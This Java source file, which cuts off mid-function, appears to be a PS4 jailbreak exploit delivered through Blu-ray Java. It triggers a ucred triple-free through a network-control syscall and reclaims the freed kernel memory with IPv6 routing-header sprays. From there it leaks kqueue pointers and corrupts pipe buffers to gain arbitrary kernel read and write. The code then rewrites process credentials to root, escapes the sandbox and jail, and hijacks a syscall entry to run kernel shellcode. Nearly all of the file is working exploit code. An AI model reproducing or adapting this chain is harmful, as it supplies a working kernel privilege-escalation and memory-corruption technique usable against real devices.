package org.bdj.external;

import java.util.*;
import java.io.*;

import org.bdj.api.*;

public class Poops {
    // constants
    private static final int AF_UNIX = 1;
    private static final int AF_INET6 = 28;
    private static final int SOCK_STREAM = 1;
    private static final int IPPROTO_IPV6 = 41;

    private static final int IPV6_RTHDR = 51;
    private static final int IPV6_RTHDR_TYPE_0 = 0;
    private static final int UCRED_SIZE = 0x168;
    private static final int MSG_HDR_SIZE = 0x30;
    private static final int UIO_IOV_NUM = 0x14;
    private static final int MSG_IOV_NUM = 0x17;
    private static final int IOV_SIZE = 0x10;

    private static final int IPV6_SOCK_NUM = 128;
    private static final int TWIN_TRIES = 15000;
    private static final int UAF_TRIES = 50000;
    private static final int KQUEUE_TRIES = 300000;
    private static final int IOV_THREAD_NUM = 4;
    private static final int UIO_THREAD_NUM = 4;
    private static final int PIPEBUF_SIZE = 0x18;

    private static final int COMMAND_UIO_READ = 0;
    private static final int COMMAND_UIO_WRITE = 1;
    private static final int PAGE_SIZE = 0x4000;
    private static final int FILEDESCENT_SIZE = 0x8;

    private static final int UIO_READ = 0;
    private static final int UIO_WRITE = 1;
    private static final int UIO_SYSSPACE = 1;

    private static final int NET_CONTROL_NETEVENT_SET_QUEUE = 0x20000003;
    private static final int NET_CONTROL_NETEVENT_CLEAR_QUEUE = 0x20000007;
    private static final int RTHDR_TAG = 0x13370000;

    private static final int SOL_SOCKET = 0xffff;
    private static final int SO_SNDBUF = 0x1001;

    private static final int F_SETFL = 4;
    private static final int O_NONBLOCK = 4;

    // system methods
    private static long dup;
    private static long close;
    private static long read;
    private static long readv;
    private static long write;
    private static long writev;
    private static long ioctl;
    private static long fcntl;
    private static long pipe;
    private static long kqueue;
    private static long socket;
    private static long socketpair;
    private static long recvmsg;
    private static long getsockopt;
    private static long setsockopt;
    private static long setuid;
    private static long getpid;
    private static long sched_yield;
    private static long cpuset_setaffinity;
    private static long __sys_netcontrol;

    // ploit data
    private static Buffer leakRthdr = new Buffer(UCRED_SIZE);
    private static Int32 leakRthdrLen = new Int32();
    private static Buffer sprayRthdr = new Buffer(UCRED_SIZE);
    private static Buffer msg = new Buffer(MSG_HDR_SIZE);
    private static int sprayRthdrLen;
    private static Buffer msgIov = new Buffer(MSG_IOV_NUM * IOV_SIZE);
    private static Buffer dummyBuffer = new Buffer(0x1000);
    private static Buffer tmp = new Buffer(PAGE_SIZE);
    private static Buffer victimPipebuf = new Buffer(PIPEBUF_SIZE);
    private static Buffer uioIovRead = new Buffer(UIO_IOV_NUM * IOV_SIZE);
    private static Buffer uioIovWrite = new Buffer(UIO_IOV_NUM * IOV_SIZE);

    private static Int32Array uioSs = new Int32Array(2);
    private static Int32Array iovSs = new Int32Array(2);

    private static IovThread[] iovThreads = new IovThread[IOV_THREAD_NUM];
    private static UioThread[] uioThreads = new UioThread[UIO_THREAD_NUM];

    private static WorkerState iovState = new WorkerState(IOV_THREAD_NUM);
    private static WorkerState uioState = new WorkerState(UIO_THREAD_NUM);

    private static int uafSock;

    private static int uioSs0;
    private static int uioSs1;

    private static int iovSs0;
    private static int iovSs1;

    private static long kl_lock;
    private static long kq_fdp;
    private static long fdt_ofiles;
    private static long allproc;

    private static int[] twins = new int[2];
    private static int[] triplets = new int[3];
    private static int[] ipv6Socks = new int[IPV6_SOCK_NUM];

    private static Int32Array masterPipeFd = new Int32Array(2);
    private static Int32Array victimPipeFd = new Int32Array(2);

    private static int masterRpipeFd;
    private static int masterWpipeFd;
    private static int victimRpipeFd;
    private static int victimWpipeFd;

    // misc data
    private static int previousCore = -1;

    private static Kernel.KernelRW kernelRW;

    private static PrintStream console;

    private static long kBase;

    private static API api;
	
	public static void setConsole(PrintStream c) {
    console = c;
	}

    // sys methods
    private static int dup(int fd) {
        return (int) Helper.api.call(dup, fd);
    }

    private static int close(int fd) {
        return (int) Helper.api.call(close, fd);
    }

    private static long read(int fd, Buffer buf, long nbytes) {
        return Helper.api.call(read, fd, buf != null ? buf.address() : 0, nbytes);
    }

    private static long readv(int fd, Buffer iov, int iovcnt) {
        return Helper.api.call(readv, fd, iov != null ? iov.address() : 0, iovcnt);
    }

    private static long write(int fd, Buffer buf, long nbytes) {
        return Helper.api.call(write, fd, buf != null ? buf.address() : 0, nbytes);
    }

    private static long writev(int fd, Buffer iov, int iovcnt) {
        return Helper.api.call(writev, fd, iov != null ? iov.address() : 0, iovcnt);
    }

    private static int ioctl(int fd, long request, long arg0) {
        return (int) Helper.api.call(ioctl, fd, request, arg0);
    }

    private static int fcntl(int fd, int cmd, long arg0) {
        return (int) Helper.api.call(fcntl, fd, cmd, arg0);
    }

    private static int pipe(Int32Array fildes) {
        return (int) Helper.api.call(pipe, fildes != null ? fildes.address() : 0);
    }

    private static int kqueue() {
        return (int) Helper.api.call(kqueue);
    }

    private static int socket(int domain, int type, int protocol) {
        return (int) Helper.api.call(socket, domain, type, protocol);
    }

    private static int socketpair(int domain, int type, int protocol, Int32Array sv) {
        return (int) Helper.api.call(socketpair, domain, type, protocol, sv != null ? sv.address() : 0);
    }

    private static int recvmsg(int s, Buffer msg, int flags) {
        return (int) Helper.api.call(recvmsg, s, msg != null ? msg.address() : 0, flags);
    }

    private static int getsockopt(int s, int level, int optname, Buffer optval, Int32 optlen) {
        return (int) Helper.api.call(getsockopt, s, level, optname, optval != null ? optval.address() : 0, optlen != null ? optlen.address() : 0);
    }

    private static int setsockopt(int s, int level, int optname, Buffer optval, int optlen) {
        return (int) Helper.api.call(setsockopt, s, level, optname, optval != null ? optval.address() : 0, optlen);
    }

    private static int setuid(int uid) {
        return (int) Helper.api.call(setuid, uid);
    }

    private static int getpid() {
        return (int) Helper.api.call(getpid);
    }

    private static int sched_yield() {
        return (int) Helper.api.call(sched_yield);
    }

    private static int __sys_netcontrol(int ifindex, int cmd, Buffer buf, int size) {
        return (int) Helper.api.call(__sys_netcontrol, ifindex, cmd, buf != null ? buf.address() : 0, size);
    }

    private static int cpusetSetAffinity(int core) {
        Buffer mask = new Buffer(0x10);
        mask.putShort(0x00, (short) (1 << core));
        return cpuset_setaffinity(3, 1, 0xFFFFFFFFFFFFFFFFL, 0x10, mask);
    }

    private static int cpuset_setaffinity(int level, int which, long id, long setsize, Buffer mask) {
        return (int)api.call(cpuset_setaffinity, level, which, id, setsize, mask != null ? mask.address() : 0);
    }

    public static void cleanup() {
        for (int i = 0; i < ipv6Socks.length; i++) {
            close(ipv6Socks[i]);
        }
        close(uioSs1);
        close(uioSs0);
        close(iovSs1);
        close(iovSs0);
        for (int i = 0; i < IOV_THREAD_NUM; i++) {
            if (iovThreads[i] != null) {
                iovThreads[i].interrupt();
                try {
                    iovThreads[i].join();
                } catch (Exception e) {}
            }
        }
        for (int i = 0; i < UIO_THREAD_NUM; i++) {
            if (iovThreads[i] != null) {
                uioThreads[i].interrupt();
                try {
                    uioThreads[i].join();
                } catch (Exception e) {}
            }
        }
        if (previousCore >= 0 && previousCore != 4) {
            //console.println("back to core " + previousCore);
            Helper.pinToCore(previousCore);
            previousCore = -1;
        }
    }

    private static int buildRthdr(Buffer buf, int size) {
        int len = ((size >> 3) - 1) & ~1;
        buf.putByte(0x00, (byte) 0); // ip6r_nxt
        buf.putByte(0x01, (byte) len); // ip6r_len
        buf.putByte(0x02, (byte) IPV6_RTHDR_TYPE_0); // ip6r_type
        buf.putByte(0x03, (byte) (len >> 1)); // ip6r_segleft
        return (len + 1) << 3;
    }

    private static int getRthdr(int s, Buffer buf, Int32 len) {
        return getsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
    }

    private static int setRthdr(int s, Buffer buf, int len) {
        return setsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
    }

    private static int freeRthdr(int s) {
        return setsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, null, 0);
    }

    private static void buildUio(Buffer uio, long uio_iov, long uio_td, boolean read, long addr, long size) {
        uio.putLong(0x00, uio_iov); // uio_iov
        uio.putLong(0x08, UIO_IOV_NUM); // uio_iovcnt
        uio.putLong(0x10, 0xFFFFFFFFFFFFFFFFL); // uio_offset
        uio.putLong(0x18, size); // uio_resid
        uio.putInt(0x20, UIO_SYSSPACE); // uio_segflg
        uio.putInt(0x24, read ? UIO_WRITE : UIO_READ); // uio_segflg
        uio.putLong(0x28, uio_td); // uio_td
        uio.putLong(0x30, addr); // iov_base
        uio.putLong(0x38, size); // iov_len
    }

    private static Buffer kreadSlow(long addr, int size) {
        Buffer[] leakBuffers = new Buffer[UIO_THREAD_NUM];
        for (int i = 0; i < UIO_THREAD_NUM; i++) {
            leakBuffers[i] = new Buffer(size);
        }
        Int32 bufSize = new Int32(size);
        setsockopt(uioSs1, SOL_SOCKET, SO_SNDBUF, bufSize, bufSize.size());
        write(uioSs1, tmp, size);
        uioIovRead.putLong(0x08, size);
        freeRthdr(ipv6Socks[triplets[1]]);
        while (true) {
            uioState.signalWork(COMMAND_UIO_READ);
            sched_yield();
            leakRthdrLen.set(0x10);
            getRthdr(ipv6Socks[triplets[0]], leakRthdr, leakRthdrLen);
            if (leakRthdr.getInt(0x08) == UIO_IOV_NUM) {
                break;
            }
            read(uioSs0, tmp, size);
            for (int i = 0; i < UIO_THREAD_NUM; i++) {
                read(uioSs0, leakBuffers[i], leakBuffers[i].size());
            }
            uioState.waitForFinished();
            write(uioSs1, tmp, size);
        }
        long uio_iov = leakRthdr.getLong(0x00);
        buildUio(msgIov, uio_iov, 0, true, addr, size);
        freeRthdr(ipv6Socks[triplets[2]]);
        while (true) {
            iovState.signalWork(0);
            sched_yield();
            leakRthdrLen.set(0x40);
            getRthdr(ipv6Socks[triplets[0]], leakRthdr, leakRthdrLen);
            if (leakRthdr.getInt(0x20) == UIO_SYSSPACE) {
                break;
            }
            write(iovSs1, tmp, Int8.SIZE);
            iovState.waitForFinished();
            read(iovSs0, tmp, Int8.SIZE);
        }
        read(uioSs0, tmp, size);
        Buffer leakBuffer = null;
        for (int i = 0; i < UIO_THREAD_NUM; i++) {
            read(uioSs0, leakBuffers[i], leakBuffers[i].size());
            if (leakBuffers[i].getLong(0x00) != 0x4141414141414141L) {
                triplets[1] = findTriplet(triplets[0], -1, UAF_TRIES);
                if (triplets[1] == -1)
                {
                    console.println("kreadSlow triplet failure 1");
                    return null;
                }
                leakBuffer = leakBuffers[i];
            }
        }
        uioState.waitForFinished();
        write(iovSs1, tmp, Int8.SIZE);
        triplets[2] = findTriplet(triplets[0], triplets[1], UAF_TRIES);
        if (triplets[2] == -1)
        {
            console.println("kreadSlow triplet failure 2");
            return null;
        }
        iovState.waitForFinished();
        read(iovSs0, tmp, Int8.SIZE);
        return leakBuffer;
    }

    private static boolean kwriteSlow(long addr, Buffer buffer) {
        Int32 bufSize = new Int32(buffer.size());
        setsockopt(uioSs1, SOL_SOCKET, SO_SNDBUF, bufSize, bufSize.size());
        uioIovWrite.putLong(0x08, buffer.size());
        freeRthdr(ipv6Socks[triplets[1]]);
        while (true) {
            uioState.signalWork(COMMAND_UIO_WRITE);
            sched_yield();
            leakRthdrLen.set(0x10);
            getRthdr(ipv6Socks[triplets[0]], leakRthdr, leakRthdrLen);
            if (leakRthdr.getInt(0x08) == UIO_IOV_NUM) {
                break;
            }
            for (int i = 0; i < UIO_THREAD_NUM; i++) {
                write(uioSs1, buffer, buffer.size());
            }
            uioState.waitForFinished();
        }
        long uio_iov = leakRthdr.getLong(0x00);
        buildUio(msgIov, uio_iov, 0, false, addr, buffer.size());
        freeRthdr(ipv6Socks[triplets[2]]);
        while (true) {
            iovState.signalWork(0);
            sched_yield();
            leakRthdrLen.set(0x40);
            getRthdr(ipv6Socks[triplets[0]], leakRthdr, leakRthdrLen);
            if (leakRthdr.getInt(0x20) == UIO_SYSSPACE) {
                break;
            }
            write(iovSs1, tmp, Int8.SIZE);
            iovState.waitForFinished();
            read(iovSs0, tmp, Int8.SIZE);
        }
        for (int i = 0; i < UIO_THREAD_NUM; i++) {
            write(uioSs1, buffer, buffer.size());
        }
        triplets[1] = findTriplet(triplets[0], -1, UAF_TRIES);
        if (triplets[1] == -1)
        {
            console.println("kwriteSlow triplet failure 1");
            return false;
        }
        uioState.waitForFinished();
        write(iovSs1, tmp, Int8.SIZE);
        triplets[2] = findTriplet(triplets[0], triplets[1], UAF_TRIES);
        if (triplets[2] == -1)
        {
            console.println("kwriteSlow triplet failure 2");
            return false;
        }
        iovState.waitForFinished();
        read(iovSs0, tmp, Int8.SIZE);
        return true;
    }

    public static boolean performSetup() {
        try {
            api = API.getInstance();

            dup = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "dup");
            close = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "close");
            read = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "read");
            readv = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "readv");
            write = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "write");
            writev = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "writev");
            ioctl = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "ioctl");
            fcntl = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "fcntl");
            pipe = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "pipe");
            kqueue = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "kqueue");
            socket = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "socket");
            socketpair = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "socketpair");
            recvmsg = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "recvmsg");
            getsockopt = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "getsockopt");
            setsockopt = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "setsockopt");
            setuid = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "setuid");
            getpid = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "getpid");
            sched_yield = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "sched_yield");
            cpuset_setaffinity = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "cpuset_setaffinity");
            __sys_netcontrol = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "__sys_netcontrol");
            if (dup == 0 || close == 0 || read == 0 || readv == 0 || write == 0 || writev == 0  || ioctl == 0 || fcntl == 0 || pipe == 0 || kqueue == 0 || socket == 0 || socketpair == 0 ||
            recvmsg == 0 || getsockopt == 0 || setsockopt == 0 || setuid == 0 || getpid == 0 || sched_yield == 0 || __sys_netcontrol == 0 || cpuset_setaffinity == 0) {
                console.println("failed to resolve symbols");
                return false;
            }

            // Prepare spray buffer.
            sprayRthdrLen = buildRthdr(sprayRthdr, UCRED_SIZE);

            // Prepare msg iov buffer.
            msg.putLong(0x10, msgIov.address()); // msg_iov
            msg.putLong(0x18, MSG_IOV_NUM); // msg_iovlen

            dummyBuffer.fill((byte) 0x41);
            uioIovRead.putLong(0x00, dummyBuffer.address());
            uioIovWrite.putLong(0x00, dummyBuffer.address());

            // affinity
            previousCore = Helper.getCurrentCore();

            if (cpusetSetAffinity(4) != 0) {
                console.println("failed to pin to core");
                return false;
            }

            if (!Helper.setRealtimePriority(256)) {
                console.println("failed realtime priority");
                return false;
            }

            // Create socket pair for uio spraying.
            socketpair(AF_UNIX, SOCK_STREAM, 0, uioSs);
            uioSs0 = uioSs.get(0);
            uioSs1 = uioSs.get(1);

            // Create socket pair for iov spraying.
            socketpair(AF_UNIX, SOCK_STREAM, 0, iovSs);
            iovSs0 = iovSs.get(0);
            iovSs1 = iovSs.get(1);

            // Create iov threads.
            for (int i = 0; i < IOV_THREAD_NUM; i++) {
                iovThreads[i] = new IovThread(iovState);
                iovThreads[i].start();
            }

            // Create uio threads.
            for (int i = 0; i < UIO_THREAD_NUM; i++) {
                uioThreads[i] = new UioThread(uioState);
                uioThreads[i].start();
            }

            // Set up sockets for spraying.
            for (int i = 0; i < ipv6Socks.length; i++) {
                ipv6Socks[i] = socket(AF_INET6, SOCK_STREAM, 0);
            }

            // Initialize pktopts.
            for (int i = 0; i < ipv6Socks.length; i++) {
                freeRthdr(ipv6Socks[i]);
            }

            // init pipes
            pipe(masterPipeFd);
            pipe(victimPipeFd);

            masterRpipeFd = masterPipeFd.get(0);
            masterWpipeFd = masterPipeFd.get(1);
            victimRpipeFd = victimPipeFd.get(0);
            victimWpipeFd = victimPipeFd.get(1);

            fcntl(masterRpipeFd, F_SETFL, O_NONBLOCK);
            fcntl(masterWpipeFd, F_SETFL, O_NONBLOCK);
            fcntl(victimRpipeFd, F_SETFL, O_NONBLOCK);
            fcntl(victimWpipeFd, F_SETFL, O_NONBLOCK);

            return true;
        } catch (Exception e) {
            console.println("exception during performSetup");
            return false;
        }
    }

    private static boolean findTwins(int timeout) {
        while (timeout-- != 0) {
            for (int i = 0; i < ipv6Socks.length; i++) {
                sprayRthdr.putInt(0x04, RTHDR_TAG | i);
                setRthdr(ipv6Socks[i], sprayRthdr, sprayRthdrLen);
            }

            for (int i = 0; i < ipv6Socks.length; i++) {
                leakRthdrLen.set(Int64.SIZE);
                getRthdr(ipv6Socks[i], leakRthdr, leakRthdrLen);
                int val = leakRthdr.getInt(0x04);
                int j = val & 0xFFFF;
                if ((val & 0xFFFF0000) == RTHDR_TAG && i != j) {
                    twins[0] = i;
                    twins[1] = j;
                    return true;
                }
            }
        }
        return false;
    }

    private static int findTriplet(int master, int other, int timeout) {
        while (timeout-- != 0) {
            for (int i = 0; i < ipv6Socks.length; i++) {
                if (i == master || i == other) {
                    continue;
                }
                sprayRthdr.putInt(0x04, RTHDR_TAG | i);
                setRthdr(ipv6Socks[i], sprayRthdr, sprayRthdrLen);
            }

            for (int i = 0; i < ipv6Socks.length; i++) {
                if (i == master || i == other) {
                    continue;
                }
                leakRthdrLen.set(Int64.SIZE);
                getRthdr(ipv6Socks[master], leakRthdr, leakRthdrLen);
                int val = leakRthdr.getInt(0x04);
                int j = val & 0xFFFF;
                if ((val & 0xFFFF0000) == RTHDR_TAG && j != master && j != other) {
                    return j;
                }
            }
        }
        return -1;
    }

    private static long kreadSlow64(long address) {
        return kreadSlow(address, Int64.SIZE).getLong(0x00);
    }

    private static void fhold(long fp) {
        kwrite32(fp + 0x28, kread32(fp + 0x28) + 1); // f_count
    }

    private static long fget(int fd) {
        return kread64(fdt_ofiles + fd * FILEDESCENT_SIZE);
    }

    private static void removeRthrFromSocket(int fd) {
        long fp = fget(fd);
        long f_data = kread64(fp + 0x00);
        long so_pcb = kread64(f_data + 0x18);
        long in6p_outputopts = kread64(so_pcb + 0x118);
        kwrite64(in6p_outputopts + 0x68, 0); // ip6po_rhi_rthdr
    }

    private static int corruptPipebuf(int cnt, int in, int out, int size, long buffer) {
        if (buffer == 0) {
            throw new IllegalArgumentException("buffer cannot be zero");
        }
        victimPipebuf.putInt(0x00, cnt); // cnt
        victimPipebuf.putInt(0x04, in); // in
        victimPipebuf.putInt(0x08, out); // out
        victimPipebuf.putInt(0x0C, size); // size
        victimPipebuf.putLong(0x10, buffer); // buffer
        write(masterWpipeFd, victimPipebuf, victimPipebuf.size());
        return (int) read(masterRpipeFd, victimPipebuf, victimPipebuf.size());
    }

    public static int kread(Buffer dest, long src, long n) {
        corruptPipebuf((int) n, 0, 0, PAGE_SIZE, src);
        return (int) read(victimRpipeFd, dest, n);
    }

    public static int kwrite(long dest, Buffer src, long n) {
        corruptPipebuf(0, 0, 0, PAGE_SIZE, dest);
        return (int) write(victimWpipeFd, src, n);
    }

    public static void kwrite32(long addr, int val) {
        tmp.putInt(0x00, val);
        kwrite(addr, tmp, Int32.SIZE);
    }

    public static void kwrite64(long addr, long val) {
        tmp.putLong(0x00, val);
        kwrite(addr, tmp, Int64.SIZE);
    }

    public static long kread64(long addr) {
        kread(tmp, addr, Int64.SIZE);
        return tmp.getLong(0x00);
    }

    public static int kread32(long addr) {
        kread(tmp, addr, Int32.SIZE);
        return tmp.getInt(0x00);
    }

    private static void removeUafFile() {
        long uafFile = fget(uafSock);
        kwrite64(fdt_ofiles + uafSock * FILEDESCENT_SIZE, 0);
        int removed = 0;
        Int32Array ss = new Int32Array(2);
        for (int i = 0; i < UAF_TRIES; i++) {
            int s = socket(AF_UNIX, SOCK_STREAM, 0);
            if (fget(s) == uafFile) {
                kwrite64(fdt_ofiles + s * FILEDESCENT_SIZE, 0);
                removed++;
            }
            close(s);
            if (removed == 3) {
                break;
            }
        }
    }

    private static boolean achieveRw(int timeout) {
        try {
            // Free one.
            freeRthdr(ipv6Socks[triplets[1]]);

            // Leak kqueue.
            int kq = 0;
            while (timeout-- != 0) {
                kq = kqueue();

                // Leak with other rthdr.
                leakRthdrLen.set(0x100);
                getRthdr(ipv6Socks[triplets[0]], leakRthdr, leakRthdrLen);
                if (leakRthdr.getLong(0x08) == 0x1430000 && leakRthdr.getLong(0x98) != 0) {
                    break;
                }
                close(kq);
            }

            if (timeout <= 0)
            {
                console.println("kqueue realloc failed");
                return false;
            }

            kl_lock = leakRthdr.getLong(0x60);
            kq_fdp = leakRthdr.getLong(0x98);
            close(kq);

            // Find triplet.
            triplets[1] = findTriplet(triplets[0], triplets[2], UAF_TRIES);
            if (triplets[1] == -1)
            {
                console.println("kqueue triplets 1 failed ");
                return false;
            }

            long fd_files = kreadSlow64(kq_fdp);
            fdt_ofiles = fd_files + 0x00;

            long masterRpipeFile = kreadSlow64(fdt_ofiles + masterPipeFd.get(0) * FILEDESCENT_SIZE);
            long victimRpipeFile = kreadSlow64(fdt_ofiles + victimPipeFd.get(0) * FILEDESCENT_SIZE);
            long masterRpipeData = kreadSlow64(masterRpipeFile + 0x00);
            long victimRpipeData = kreadSlow64(victimRpipeFile + 0x00);

            Buffer masterPipebuf = new Buffer(PIPEBUF_SIZE);
            masterPipebuf.putInt(0x00, 0); // cnt
            masterPipebuf.putInt(0x04, 0); // in
            masterPipebuf.putInt(0x08, 0); // out
            masterPipebuf.putInt(0x0C, PAGE_SIZE); // size
            masterPipebuf.putLong(0x10, victimRpipeData); // buffer
            kwriteSlow(masterRpipeData, masterPipebuf);

            fhold(fget(masterPipeFd.get(0)));
            fhold(fget(masterPipeFd.get(1)));
            fhold(fget(victimPipeFd.get(0)));
            fhold(fget(victimPipeFd.get(1)));

            for (int i = 0; i < triplets.length; i++) {
                removeRthrFromSocket(ipv6Socks[triplets[i]]);
            }

            removeUafFile();
        } catch (Exception e)
        {
            console.println("exception during stage 1");
            return false;
        }
        return true;
    }

    private static long pfind(int pid) {
        long p = kread64(allproc);
        while (p != 0) {
            if (kread32(p + 0xb0) == pid) {
                break;
            }
            p = kread64(p + 0x00); // p_list.le_next
        }
        return p;
    }

    private static long getPrison0() {
        long p = pfind(0);
        long p_ucred = kread64(p + 0x40);
        long prison0 = kread64(p_ucred + 0x30);
        return prison0;
    }

    private static long getRootVnode(int i) {
        long p = pfind(0);
        long p_fd = kread64(p + 0x48);
        long rootvnode = kread64(p_fd + i);
        return rootvnode;
    }

    private static boolean escapeSandbox() {
        // get curproc
        Int32Array pipeFd = new Int32Array(2);
        pipe(pipeFd);
        
        Int32 currPid = new Int32();
        int curpid = getpid();
        currPid.set(curpid);
        ioctl(pipeFd.get(0), 0x8004667CL, currPid.address());

        long fp = fget(pipeFd.get(0));
        long f_data = kread64(fp + 0x00);
        long pipe_sigio = kread64(f_data + 0xd0);
        long curproc = kread64(pipe_sigio);
        long p = curproc;

        // get allproc
        while ((p & 0xFFFFFFFF00000000L) != 0xFFFFFFFF00000000L) {
            p = kread64(p + 0x08); // p_list.le_prev
        }

        allproc = p;

        close(pipeFd.get(1));
        close(pipeFd.get(0));

        kBase = kl_lock - KernelOffset.getPS4Offset("KL_LOCK");

        long OFFSET_P_UCRED = 0x40;
        long procFd = kread64(curproc + KernelOffset.PROC_FD);
        long ucred = kread64(curproc + OFFSET_P_UCRED);
        
        if ((procFd >>> 48) != 0xFFFF) {
            console.print("bad procfd");
            return false;
        }
        if ((ucred >>> 48) != 0xFFFF) {
            console.print("bad ucred");
            return false;
        }
        
        kwrite32(ucred + 0x04, 0); // cr_uid
        kwrite32(ucred + 0x08, 0); // cr_ruid
        kwrite32(ucred + 0x0C, 0); // cr_svuid
        kwrite32(ucred + 0x10, 1); // cr_ngroups
        kwrite32(ucred + 0x14, 0); // cr_rgid

        long prison0 = getPrison0();
        if ((prison0 >>> 48) != 0xFFFF) {
            console.print("bad prison0");
            return false;
        }
        kwrite64(ucred + 0x30, prison0);

        // Add JIT privileges
        kwrite64(ucred + 0x60, -1);
        kwrite64(ucred + 0x68, -1);

        long rootvnode = getRootVnode(0x10);
        if ((rootvnode >>> 48) != 0xFFFF) {
            console.print("bad rootvnode");
            return false;
        }
        kwrite64(procFd + 0x10, rootvnode); // fd_rdir
        kwrite64(procFd + 0x18, rootvnode); // fd_jdir
        return true;
    }

    private static boolean triggerUcredTripleFree() {
        try {
            Buffer setBuf = new Buffer(8);
            Buffer clearBuf = new Buffer(8);
            msgIov.putLong(0x00, 1); // iov_base
            msgIov.putLong(0x08, Int8.SIZE); // iov_len
            int dummySock = socket(AF_UNIX, SOCK_STREAM, 0);
            setBuf.putInt(0x00, dummySock);
            __sys_netcontrol(-1, NET_CONTROL_NETEVENT_SET_QUEUE, setBuf, setBuf.size());
            close(dummySock);
            setuid(1);
            uafSock = socket(AF_UNIX, SOCK_STREAM, 0);
            setuid(1);
            clearBuf.putInt(0x00, uafSock);
            __sys_netcontrol(-1, NET_CONTROL_NETEVENT_CLEAR_QUEUE, clearBuf, clearBuf.size());
            for (int i = 0; i < 32; i++) {
                iovState.signalWork(0);
                sched_yield();
                write(iovSs1, tmp, Int8.SIZE);
                iovState.waitForFinished();
                read(iovSs0, tmp, Int8.SIZE);
            }
            close(dup(uafSock));
            if (!findTwins(TWIN_TRIES))
            {
                console.println("twins failed");
                return false;
            }

            freeRthdr(ipv6Socks[twins[1]]);
            int timeout = UAF_TRIES;
            while (timeout-- > 0) {
                iovState.signalWork(0);
                sched_yield();
                leakRthdrLen.set(Int64.SIZE);
                getRthdr(ipv6Socks[twins[0]], leakRthdr, leakRthdrLen);
                if (leakRthdr.getInt(0x00) == 1) {
                    break;
                }
                write(iovSs1, tmp, Int8.SIZE);
                iovState.waitForFinished();
                read(iovSs0, tmp, Int8.SIZE);
            }
            if (timeout <= 0)
            {
                console.println("iov reclaim failed");
                return false;
            }
            triplets[0] = twins[0];
            close(dup(uafSock));
            triplets[1] = findTriplet(triplets[0], -1, UAF_TRIES);
            if (triplets[1] == -1)
            {
                console.println("triplets 1 failed");
                return false;
            }
            write(iovSs1, tmp, Int8.SIZE);
            triplets[2] = findTriplet(triplets[0], triplets[1], UAF_TRIES);
            if (triplets[2] == -1)
            {
                console.println("triplets 2 failed");
                return false;
            }
            iovState.waitForFinished();
            read(iovSs0, tmp, Int8.SIZE);
        } catch (Exception e)
        {
            console.println("exception during stage 0");
            return false;
        }
        return true;
    }

    private static boolean applyKernelPatchesPS4() {
        try {
            byte[] shellcode = KernelOffset.getKernelPatchesShellcode();
            if (shellcode.length == 0) {
                return false;
            }

            long sysent661Addr = kBase + KernelOffset.getPS4Offset("SYSENT_661_OFFSET");
            long mappingAddr = 0x920100000L;
            long shadowMappingAddr = 0x926100000L;

            int syNarg = kread32(sysent661Addr);
            long syCall = kread64(sysent661Addr + 8);
            int syThrcnt = kread32(sysent661Addr + 0x2c);
            kwrite32(sysent661Addr, 2);
            kwrite64(sysent661Addr + 8, kBase + KernelOffset.getPS4Offset("JMP_RSI_GADGET"));
            kwrite32(sysent661Addr + 0x2c, 1);
            
            int PROT_READ = 0x1;
            int PROT_WRITE = 0x2;
            int PROT_EXEC = 0x4;
            int PROT_RW = PROT_READ | PROT_WRITE;
            int PROT_RWX = PROT_READ | PROT_WRITE | PROT_EXEC;
            
            int alignedMemsz = 0x10000;
            // create shm with exec permission
            long execHandle = Helper.syscall(Helper.SYS_JITSHM_CREATE, 0L, (long)alignedMemsz, (long)PROT_RWX);
            // create shm alias with write permission
            long writeHandle = Helper.syscall(Helper.SYS_JITSHM_ALIAS, execHandle, (long)PROT_RW);
            // map shadow mapping and write into it
            Helper.syscall(Helper.SYS_MMAP, shadowMappingAddr, (long)alignedMemsz, (long)PROT_RW, 0x11L, writeHandle, 0L);
            for (int i = 0; i < shellcode.length; i++) {
                api.write8(shadowMappingAddr + i, shellcode[i]);
            }
            // map executable segment
            Helper.syscall(Helper.SYS_MMAP, mappingAddr, (long)alignedMemsz, (long)PROT_RWX, 0x11L, execHandle, 0L);
            Helper.syscall(Helper.SYS_KEXEC, mappingAddr);
            kwrite32(sysent661Addr, syNarg);
            kwrite64(sysent661Addr + 8, syCall);
            kwrite32(sysent661Addr + 0x2c, syThrcnt);
            Helper.syscall(Helper.SYS_CLOSE, writeHandle);
        } catch (Exception e)
        {

        }
        return true;
    }

    public static int main(PrintStream cons) {
        Poops.console = cons;

        // check for jailbreak
        if (Helper.isJailbroken()) {
            NativeInvoke.sendNotificationRequest("Already Jailbroken");
            return 0;
        }

        // perform setup
        console.println("Pre-configuration...");
        if (!performSetup())
        {
            console.println("pre-config failure");
            cleanup();
            return -3;
        }
        console.println("Initial triple free");
        if (!triggerUcredTripleFree()) {
            cons.println("triple free failed");
            cleanup();
            return -4;
        }

        // do not print to the console to increase stability here
        if (!achieveRw(KQUEUE_TRIES)) {
            cons.println("Leak / RW failed");
            cleanup();
            return -6;
        }

        console.println("Escaping sandbox...");
        if (!escapeSandbox()) {
